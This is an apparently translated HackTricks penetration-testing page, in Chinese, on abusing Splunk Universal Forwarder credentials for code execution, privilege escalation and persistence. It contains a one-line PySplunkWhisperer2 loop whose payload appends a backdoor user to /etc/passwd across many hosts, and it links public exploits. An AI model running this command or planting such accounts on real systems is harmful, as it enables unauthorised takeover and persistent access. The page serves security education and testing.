# Splunk LPE 和持久性

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

如果在**内部**或**外部**枚举一台机器时发现**Splunk 正在运行**（端口 8090），如果你幸运地知道任何**有效凭据**，你可以**利用 Splunk 服务**以运行 Splunk 的用户身份**执行 shell**。如果是 root 用户在运行，你可以提升权限到 root。

此外，如果你**已经是 root 并且 Splunk 服务不仅在本地主机上监听**，你可以**窃取** Splunk 服务的**密码**文件并**破解**密码，或者**添加新的**凭据。并在主机上保持持久性。

在下面的第一张图片中，你可以看到 Splunkd 网页的样子。



## Splunk Universal Forwarder Agent 漏洞总结

有关更多详细信息，请查看帖子 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)。这只是一个总结：

**漏洞概述：**
针对 Splunk Universal Forwarder Agent (UF) 的漏洞允许拥有代理密码的攻击者在运行该代理的系统上执行任意代码，可能会危及整个网络。

**关键点：**
- UF 代理不验证传入连接或代码的真实性，使其容易受到未经授权的代码执行攻击。
- 常见的密码获取方法包括在网络目录、文件共享或内部文档中查找。
- 成功利用可能导致在受损主机上获得 SYSTEM 或 root 级别的访问权限、数据外泄和进一步的网络渗透。

**漏洞执行：**
1. 攻击者获取 UF 代理密码。
2. 利用 Splunk API 向代理发送命令或脚本。
3. 可能的操作包括文件提取、用户账户操作和系统妥协。

**影响：**
- 在每个主机上完全妥协网络，获得 SYSTEM/root 级别权限。
- 可能禁用日志记录以逃避检测。
- 安装后门或勒索软件。

**利用示例命令：**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**可用的公共漏洞：**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## 滥用 Splunk 查询

**有关更多详细信息，请查看帖子 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
